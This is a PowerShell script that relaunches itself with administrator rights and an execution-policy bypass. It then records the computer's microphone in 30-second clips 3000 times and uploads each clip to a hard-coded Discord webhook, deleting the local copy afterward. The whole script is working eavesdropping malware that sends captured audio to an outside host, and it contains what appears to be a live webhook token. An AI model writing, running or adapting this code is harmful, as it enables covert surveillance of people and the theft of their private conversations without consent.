# Elevation check: Relaunch script as Administrator if not elevated
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Relaunch the script with elevated privileges
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process PowerShell -Verb RunAs -ArgumentList $arguments
    exit
}

# Run the script 3000 times in a loop
for ($i = 1; $i -le 3000; $i++) {
    # Define output file name and recording duration
    $duration = 30
    $outputFile = "mic_audio_recording_$(Get-Date -Format 'yyyyMMdd_HHmmss').wav"

    # Delete the previous output file if it exists
    if (Test-Path $outputFile) {
        Remove-Item $outputFile
    }

    # Get the list of audio input devices from ffmpeg
    $audioDevices = ffmpeg -list_devices true -f dshow -i dummy 2>&1 | Select-String "Microphone"

    # Extract the first default microphone found
    $micDevice = $audioDevices -split "`r?`n" | Select-String "Microphone" | Select-Object -First 1

    # Check if a microphone was found using ffmpeg
    if ($micDevice) {
        # Clean the device name to be used in the ffmpeg command
        $micDevice = $micDevice -replace '.*"(.*)".*', '$1'

        # Build and run the ffmpeg command to record the default mic audio in mono as a .wav file
        ffmpeg -f dshow -i audio="$micDevice" -t $duration -acodec pcm_s16le -ac 1 -ar 44100 "$outputFile"

        Write-Host "Recording complete! Saved to $outputFile"
    } else {
        Write-Host "No microphone found via ffmpeg. Searching for Realtek(R) Audio inputs in Windows..."

        # Use PowerShell to search for Realtek(R) Audio input devices
        $realtekMics = Get-PnpDevice -Class 'AudioEndpoint' | Where-Object { $_.FriendlyName -match 'Realtek' -and $_.Status -eq 'OK' }

        if ($realtekMics) {
            # Use the first available Realtek microphone from Windows PnP devices
            $micDevice = $realtekMics[0].FriendlyName

            Write-Host "Found Realtek microphone: $micDevice"

            # Build and run the ffmpeg command to record the mic audio using the found Realtek microphone
            ffmpeg -f dshow -i audio="$micDevice" -t $duration -acodec pcm_s16le -ac 1 -ar 44100 "$outputFile"

            Write-Host "Recording complete! Saved to $outputFile"
        } else {
            Write-Host "No Realtek microphones found in Windows!"
        }
    }

    # Discord webhook URL
    $webhookUrl = "https://discord.com/api/webhooks/1279782310341775463/tUSoz4kMon0fVjx62uPcoeMnqhsyW3G1ISog6C_rmxfkZSKPCxJWJcJVmhuarVV4bArg"

    # Prepare the form-data for sending the file to Discord
    $boundary = [System.Guid]::NewGuid().ToString()
    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    # Prepare the form content (this includes the file and a simple message)
    $body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$outputFile"
Content-Type: application/octet-stream

$(Get-Content -Path $outputFile -Raw)
--$boundary
Content-Disposition: form-data; name="payload_json"

{
    "content": "Here is the recorded audio file, iteration $i out of 3000."
}
--$boundary--
"@

    # Send the request to Discord
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body

    Write-Host "File sent to Discord webhook!"

    # Delete the file after sending it to Discord
    if (Test-Path $outputFile) {
        Remove-Item $outputFile
        Write-Host "Output file deleted: $outputFile"
    }

    # Optional delay between recordings
    Start-Sleep -Seconds 2
}
